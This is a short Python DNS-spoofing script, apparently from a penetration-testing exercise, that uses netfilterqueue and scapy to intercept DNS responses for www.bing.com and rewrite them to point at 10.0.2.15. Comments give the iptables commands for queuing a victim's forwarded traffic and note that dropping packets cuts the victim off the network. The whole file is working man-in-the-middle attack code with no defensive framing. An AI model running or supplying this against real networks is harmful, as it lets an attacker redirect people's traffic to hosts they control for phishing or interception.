#!usr/bin/env python

# iptables -I FORWARD -j NFQUEUE --queue-num "number"
# packet.drop() disconnects the network for the victim
# -I argument in iptables is changed from FORWARD to both OUTPUT and INPUT in local machine


import netfilterqueue
import scapy.all as scapy


def process_packet(packet):
   scapy_packet = scapy.IP(packet.get_payload())
   if scapy_packet.haslayer(scapy.DNSRR):
      qname = scapy_packet[scapy.DNSQR].qname
      if "www.bing.com" in qname: # Site which should be redirected
         print("[+] Spoofing Target")
         res = scapy.DNSRR(rrname=qname,rdata="10.0.2.15") # IP to be redirected to
         scapy_packet[scapy.DNS].an = res
         scapy_packet[scapy.DNS].ancount = 1  # Changes no:of answer responses to 1

 # deletes the length and chksum of the packets to avoid corruption
         del scapy_packet[scapy.IP].len
         del scapy_packet[scapy.IP].chksum
         del scapy_packet[scapy.UDP].len
         del scapy_packet[scapy.UDP].chksum
       
         packet.set_payload(str(scapy_packet)) #Changes payload of intercepted packet 

   packet.accept()      # forwards the packets that are caught in the queue


queue = netfilterqueue.NetfilterQueue()
queue.bind(0,process_packet)
queue.run()

# iptables -- flush deletes the queue
